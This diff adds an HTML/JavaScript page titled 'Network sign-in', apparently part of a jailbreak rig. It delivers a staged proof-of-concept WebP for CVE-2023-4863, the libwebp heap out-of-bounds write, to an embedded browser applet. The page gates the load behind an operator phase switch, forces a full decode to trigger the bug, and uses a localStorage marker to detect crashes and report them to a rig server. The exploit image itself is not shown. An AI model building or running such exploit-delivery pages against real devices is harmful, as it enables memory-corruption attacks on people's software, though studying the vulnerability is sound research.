@@ -1,0 +1,446 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Network sign-in</title>
+<style>
+  /* Self-contained except the single staged probe asset. Same dark card
+     as the other rig pages. */
+  html, body { margin: 0; padding: 0; background: #101318; color: #e8eaf0;
+               font-family: sans-serif; }
+  #rig-card { max-width: 900px; margin: 24px auto; padding: 20px 24px;
+              background: #1a1f2b; border: 1px solid #2c3446; border-radius: 10px; }
+  #rig-card h1 { font-size: 24px; margin: 0 0 4px 0; }
+  #rig-card h2 { font-size: 14px; font-weight: normal; color: #8f9ab3;
+                 margin: 0 0 16px 0; }
+  #rig-state { display: inline-block; padding: 2px 10px; border-radius: 6px;
+               font-size: 14px; background: #3a4460; }
+  #rig-state.done { background: #2e6b3a; }
+  #rig-state.failed { background: #7a2e35; }
+  table { width: 100%; border-collapse: collapse; font-size: 17px; }
+  td { padding: 5px 6px; border-bottom: 1px solid #262d3d; vertical-align: top; }
+  td.k { color: #9fb0d8; white-space: nowrap; width: 40%; }
+  td.v { word-break: break-all; font-family: monospace; font-size: 15px; }
+  .note { color: #8f9ab3; font-size: 13px; margin-top: 14px; }
+</style>
+</head>
+<body>
+<div id="rig-card">
+  <h1>Network sign-in</h1>
+  <h2>libwebp Huffman-table status probe &mdash; BarbarismJB webkit-rig
+      webp4863 (CVE-2023-4863, ONE shot; the single load itself is
+      rig-gated)</h2>
+  <div id="rig-state">BOOT</div>
+  <table id="rig-rows">
+    <tr><td class="k">user agent</td><td class="v" id="rig-ua">probing&hellip;</td></tr>
+    <tr><td class="k">page url</td><td class="v" id="rig-url">&nbsp;</td></tr>
+    <tr><td class="k">phase gate</td><td class="v" id="rig-gate">asking rig&hellip;</td></tr>
+    <tr><td class="k">staged asset</td><td class="v" id="rig-asset">checking&hellip;</td></tr>
+    <tr><td class="k">the one load</td><td class="v" id="rig-load">pending</td></tr>
+    <tr><td class="k">verdict</td><td class="v" id="rig-verdict">pending</td></tr>
+    <tr><td class="k">telemetry</td><td class="v" id="rig-post">pending</td></tr>
+  </table>
+  <div class="note">This page has NO safe default phase: the probe is one
+      <tt>&lt;img&gt;</tt> load of a staged public-PoC-class lossless WebP
+      (<tt>stage/webp4863.webp</tt>), and that load runs ONLY when the
+      bench operator has advanced the rig gate to 2 (<tt>curl -X POST
+      http://RIG/rig/phase -d '{"phase":2}'</tt>, local only) AND the
+      asset is staged. Below that it reports SKIPPED-GATED / SKIPPED-NO-
+      ASSET. If the load crashes the applet, the armed marker says so on
+      the next load -- that crash IS the verdict (contiguous heap OOB
+      write, 100% attacker bytes; next steps are manual). Page marker
+      webp4863 (see docs/RIG.md).</div>
+</div>
+<noscript><div style="color:#e8eaf0;padding:20px">
+  JavaScript did not run: the applet blocked scripting or the page did not
+  load. Record this -- it is a negative result for the probe.</div></noscript>
+<script>
+/* BarbarismJB webkit-rig webp4863 page: CVE-2023-4863 status probe.
+ *
+ * PROVENANCE -- the uncertainty as documented in docs/NDAYS-C-TIER.md
+ * (verdict 2): the applet's libwebp version is UNPINNABLE from strings
+ * (the decoder ABI check compiled to `and w9,w1,#0xFFFFFF00; cmp
+ * w9,#0x200`, erasing the minor version -- 0x0209 vs 0x021x are
+ * indistinguishable). If the bundled libwebp is < 1.3.2,
+ * BuildHuffmanTable performs a contiguous heap OOB WRITE with fully
+ * attacker-controlled bytes -- the strongest primitive class in the
+ * whole program. Static resolution (disassembling the 1.3.2
+ * bounds-check shape) is a separate workstream; this page is the
+ * RUNTIME half: one public-PoC-class lossless WebP through <img>.
+ *
+ * Gating: unlike the other kit pages there is no free phase 1. The
+ * single load requires rig phase >= 2 (the same deliberate operator
+ * action that arms fontchain/pngztxt phase 2) -- a known-critical
+ * candidate is never fired by merely opening the page. With the gate
+ * closed the page only (a) checks whether the asset is staged at
+ * /stage/webp4863.webp and (b) reports SKIPPED. There are no further
+ * phases: if the load crashes the applet, the armed localStorage marker
+ * reports it on the next load and everything after is manual.
+ *
+ * ES5-only host syntax; templates {{RIG_HOST}}/{{RIG_PORT}} with the
+ * usual location.host fallback.
+ */
+
+var RIG_SCHEMA = 1;
+var RIG_PAGE = "webp4863";
+var RIG_HOST = "{{RIG_HOST}}";
+var RIG_PORT = "{{RIG_PORT}}";
+var RIG_FILLED = RIG_HOST.indexOf("{{") !== 0;
+var RIG_BASE = RIG_FILLED
+    ? "http://" + RIG_HOST + ":" + RIG_PORT
+    : (location.protocol + "//" + location.host);
+var ASSET_URL = RIG_BASE + "/stage/webp4863.webp";
+var GATE_FOR_LOAD = 2;               /* the single load needs rig phase 2 */
+
+/* ------------------------------------------------- config constants */
+var CFG = {
+  LOAD_TIMEOUT_MS: 10000             /* the one load's watchdog          */
+};
+
+var R = {
+  schema: RIG_SCHEMA,
+  page: "webp4863",
+  phase: "boot",
+  seq: 0,
+  startedAt: (new Date()).toISOString(),
+  stage: "boot",
+  rig: { templated: RIG_FILLED ? (RIG_HOST + ":" + RIG_PORT) : null,
+         base: RIG_BASE, pageHost: location.host },
+  location: { url: location.href, referrer: document.referrer || null },
+  env: { userAgent: navigator.userAgent },
+  gate: { rigPhase: null, requestedPhase: null, effectivePhase: null,
+          gateForLoad: GATE_FOR_LOAD, priorCrash: false },
+  asset: null,
+  load: null,
+  verdict: null,
+  cfg: { loadTimeoutMs: CFG.LOAD_TIMEOUT_MS },
+  errors: []
+};
+
+function fail(stage, e) {
+  if (R.errors.length < 20) {
+    R.errors.push({ stage: stage, error: String(e && e.message ? e.message : e) });
+  }
+}
+function $(id) { return document.getElementById(id); }
+function setRow(id, text) { try { $(id).textContent = String(text); } catch (e) {} }
+function setState(text, cls) {
+  try { var el = $("rig-state"); el.textContent = text;
+        el.className = cls || ""; } catch (e) {}
+}
+function nowMs() {
+  try {
+    if (typeof performance !== "undefined" && performance &&
+        typeof performance.now === "function") {
+      return performance.now();
+    }
+  } catch (e) {}
+  return Date.now();
+}
+function r3(x) { return Math.round(x * 1000) / 1000; }
+function probe(stage, fn) {
+  try { return fn(); } catch (e) { fail(stage, e); return null; }
+}
+
+/* ------------------------------------------------------- transport */
+function sendJson(url, obj, cb) {
+  var payload;
+  try { payload = JSON.stringify(obj); }
+  catch (e) { fail("post.stringify", e); cb(false); return; }
+  if (typeof fetch === "function") {
+    fetch(url, { method: "POST",
+                 headers: { "Content-Type": "application/json" },
+                 body: payload })
+      .then(function (res) { cb(!!res && res.ok); })
+      .catch(function () { viaXhr(url, payload, cb); });
+    return;
+  }
+  viaXhr(url, payload, cb);
+}
+function viaXhr(url, payload, cb) {
+  if (typeof XMLHttpRequest === "undefined") { cb(false); return; }
+  var done = false;
+  function finish(ok) { if (!done) { done = true; cb(ok); } }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", url, true);
+    xhr.timeout = 5000;
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) { finish(xhr.status >= 200 && xhr.status < 300); }
+    };
+    xhr.onerror = function () { finish(false); };
+    xhr.ontimeout = function () { finish(false); };
+    xhr.send(payload);
+  } catch (e) { fail("post.xhr", e); finish(false); }
+}
+var BACKOFF_MS = [250, 500, 1000, 2000, 4000, 8000];
+function postReport(phase, cb) {
+  var attempts = 0;
+  function attempt() {
+    attempts++;
+    R.phase = phase;
+    R.seq++;
+    sendJson(RIG_BASE + "/report", R, function (ok) {
+      if (ok) { cb(true, attempts); return; }
+      if (attempts <= BACKOFF_MS.length) {
+        setRow("rig-post", "retry " + attempts + " in " + BACKOFF_MS[attempts - 1] + "ms");
+        setTimeout(attempt, BACKOFF_MS[attempts - 1]);
+      } else { cb(false, attempts); }
+    });
+  }
+  attempt();
+}
+function getJson(url, cb, timeoutMs) {
+  var settled = false;
+  var to = setTimeout(function () {
+    if (!settled) { settled = true; cb(null, "timeout"); }
+  }, timeoutMs || 4000);
+  if (typeof fetch === "function") {
+    fetch(url)
+      .then(function (res) { return res.json(); })
+      .then(function (j) {
+        if (!settled) { settled = true; clearTimeout(to); cb(j, null); }
+      })
+      .catch(function (e) {
+        if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); }
+      });
+    return;
+  }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.timeout = timeoutMs || 4000;
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && !settled) {
+        settled = true; clearTimeout(to);
+        if (xhr.status >= 200 && xhr.status < 300) {
+          try { cb(JSON.parse(xhr.responseText), null); }
+          catch (e) { cb(null, "bad json"); }
+        } else { cb(null, "HTTP " + xhr.status); }
+      }
+    };
+    xhr.onerror = function () {
+      if (!settled) { settled = true; clearTimeout(to); cb(null, "xhr.error"); }
+    };
+    xhr.send();
+  } catch (e) { if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); } }
+}
+
+/* ------------------------------------------------- crash-oracle marker */
+var MARKER_KEY = "webp4863:last-run";
+function armMarker(tag) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "armed", tag: tag,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function disarmMarker(tag, verdict) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "done", tag: tag,
+                                                     verdict: verdict,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function checkPriorCrash() {
+  try {
+    var raw = localStorage.getItem(MARKER_KEY);
+    if (!raw) { return null; }
+    var m = JSON.parse(raw);
+    return m && m.state === "armed" ? m : null;
+  } catch (e) { return null; }
+}
+
+/* ---------------------------------------------------- asset check */
+/* fetch probe: is the PoC asset staged? (absent -> clean skip, exactly
+ * like fontchain's crafted-font check; we only need existence, HEAD
+ * would be cleaner but <img>-grade engines always have GET) */
+function checkAsset(cb) {
+  if (typeof fetch !== "function") {
+    R.asset = { staged: null, reason: "no fetch (existence unknown)" };
+    cb(false);
+    return;
+  }
+  fetch(ASSET_URL)
+    .then(function (res) {
+      R.asset = { staged: res.ok, httpStatus: res.status };
+      if (res.ok) {
+        /* drain the body so the connection closes cleanly */
+        try { return res.arrayBuffer().then(function (b) {
+          R.asset.bytes = b.byteLength;
+          cb(true);
+        }, function () { cb(true); }); } catch (e) { cb(true); }
+        return;
+      }
+      cb(false);
+    })
+    .catch(function (e) {
+      R.asset = { staged: false, reason: String(e && e.message ? e.message : e) };
+      cb(false);
+    });
+}
+
+/* ---------------------------------------------------- the one load */
+function theOneLoad(cb) {
+  var rec = { url: ASSET_URL };
+  var settled = false;
+  var t0 = nowMs();
+  var toTimer = null;
+  var img = new Image();
+  function done() {
+    if (settled) { return; }
+    settled = true;
+    if (toTimer) { clearTimeout(toTimer); toTimer = null; }
+    rec.totalMs = r3(nowMs() - t0);
+    try { img.onload = img.onerror = null; } catch (e) {}
+    R.load = rec;
+    cb(rec);
+  }
+  img.onload = function () {
+    rec.outcome = "load";
+    rec.naturalW = img.naturalWidth;
+    rec.naturalH = img.naturalHeight;
+    /* decode() forces the full lossless path (the Huffman tables are
+     * built during decode, not during load in every engine) */
+    if (img.decode && typeof img.decode === "function") {
+      var td = nowMs();
+      img.decode().then(function () {
+        rec.decodeMs = r3(nowMs() - td);
+        rec.decodeOk = true;
+        done();
+      }, function (e) {
+        rec.decodeMs = r3(nowMs() - td);
+        rec.decodeOk = false;
+        rec.decodeError = String(e && e.message ? e.message : e).slice(0, 160);
+        done();
+      });
+      return;
+    }
+    done();
+  };
+  img.onerror = function () {
+    /* image rejected -- graceful error, NOT a crash; the applet survived.
+     * A crash would look like: no telemetry after this run + armed marker */
+    rec.outcome = "error";
+    done();
+  };
+  toTimer = setTimeout(function () {
+    rec.outcome = "timeout";
+    done();
+  }, CFG.LOAD_TIMEOUT_MS);
+  img.src = ASSET_URL + "?run=" + Date.now();   /* defeat any cache */
+}
+
+/* ------------------------------------------------------------ driver */
+function gateRow() {
+  return "rig=" + (R.gate.rigPhase == null ? "?" : R.gate.rigPhase) +
+         " want=" + (R.gate.requestedPhase == null ? "?" : R.gate.requestedPhase) +
+         " effective=" + R.gate.effectivePhase +
+         " (load needs rig >= " + GATE_FOR_LOAD + ")";
+}
+function run() {
+  setRow("rig-url", location.href);
+  setRow("rig-ua", navigator.userAgent || "(no navigator.userAgent)");
+
+  var prior = checkPriorCrash();
+  if (prior) {
+    R.gate.priorCrash = true;
+    R.gate.priorCrashMarker = prior;
+    setRow("rig-verdict", "PRIOR RUN LEFT ARMED MARKER -- THE LOAD CRASHED " +
+           "THE APPLET (" + (prior.tag || "?") + " at " + (prior.ts || "?") +
+           "); next steps are manual");
+  }
+
+  var want = GATE_FOR_LOAD;          /* the page's only content IS phase 2 */
+  try {
+    var mWant = location.search.match(/[?&]phase=(\d+)/);
+    if (mWant) { want = Math.max(1, Math.min(3, parseInt(mWant[1], 10))); }
+  } catch (e) {}
+  R.gate.requestedPhase = want;
+  getJson(RIG_BASE + "/rig/phase", function (j, err) {
+    if (j && typeof j.phase === "number") {
+      R.gate.rigPhase = j.phase;
+    } else {
+      R.gate.rigPhase = 1;                    /* unreachable gate == safe */
+      R.gate.gateError = err || "unparsable";
+    }
+    R.gate.effectivePhase = Math.min(R.gate.rigPhase, want);
+    setRow("rig-gate", gateRow());
+
+    postReport("env", function (ok, att) {
+      setRow("rig-post", ok ? "sent (env, " + att + " attempt(s))"
+                            : "env POST failed after " + att);
+    });
+
+    checkAsset(function (staged) {
+      setRow("rig-asset", R.asset.staged === true
+          ? "staged (" + (R.asset.bytes || "?") + " bytes)"
+          : R.asset.staged === false ? "absent" : "unknown");
+      if (!staged) {
+        R.verdict = "SKIPPED-NO-ASSET";
+        setRow("rig-load", "not attempted");
+        return finish("SKIPPED-NO-ASSET");
+      }
+      if (R.gate.effectivePhase < GATE_FOR_LOAD) {
+        R.verdict = "SKIPPED-GATED";
+        setRow("rig-load", "not attempted (advance /rig/phase to " +
+               GATE_FOR_LOAD + " to arm the single load)");
+        return finish("SKIPPED-GATED");
+      }
+      /* armed: this is the one dangerous action */
+      armMarker("the-one-load");
+      setRow("rig-load", "loading&hellip;");
+      theOneLoad(function (rec) {
+        setRow("rig-load", rec.outcome +
+               (rec.naturalW != null ? " " + rec.naturalW + "x" + rec.naturalH : "") +
+               (rec.decodeMs != null ? " decode " + rec.decodeMs + "ms" : "") +
+               " " + rec.totalMs + "ms");
+        var v = rec.outcome === "load" ? "LOADED-SURVIVED"
+            : rec.outcome === "error" ? "DECODE-ERROR-SURVIVED"
+            : "LOAD-TIMEOUT";
+        return finish(v);
+      });
+    });
+  });
+
+  /* watchdog: the page must always POST a result */
+  setTimeout(function () {
+    if (R.stage === "done") { return; }
+    fail("watchdog", "budget exceeded in stage " + R.stage);
+    finish("WATCHDOG");
+  }, 20000);
+
+  function finish(v) {
+    if (R.stage === "done") { return; }
+    R.stage = "done";
+    R.verdict = v;
+    setRow("rig-verdict", v);
+    setState("DONE", v === "LOADED-SURVIVED" || v.indexOf("SKIPPED") === 0
+             ? "done" : "failed");
+    disarmMarker(v, v);
+    postReport("verdict", function (ok, att) {
+      setRow("rig-post", ok ? "sent (verdict, " + att + " attempt(s))"
+                            : "FAILED after " + att + " attempts");
+    });
+  }
+}
+
+/* expose for wsagent-driven repetition (manual only; still gate-free
+ * server-side because the asset is stage/ operator-controlled) */
+window.__webp4863 = window.__webp4863 || {};
+window.__webp4863.cfg = CFG;
+window.__webp4863.theOneLoad = theOneLoad;
+
+try {
+  run();
+} catch (e) {
+  fail("driver", e);
+  R.stage = "CRASHED@" + (R.stage || "driver");
+  setState("PROBE CRASHED", "failed");
+  setRow("rig-verdict", R.stage);
+  try { postReport("crash", function () {}); } catch (e2) {}
+}
+</script>
+</body>
+</html>
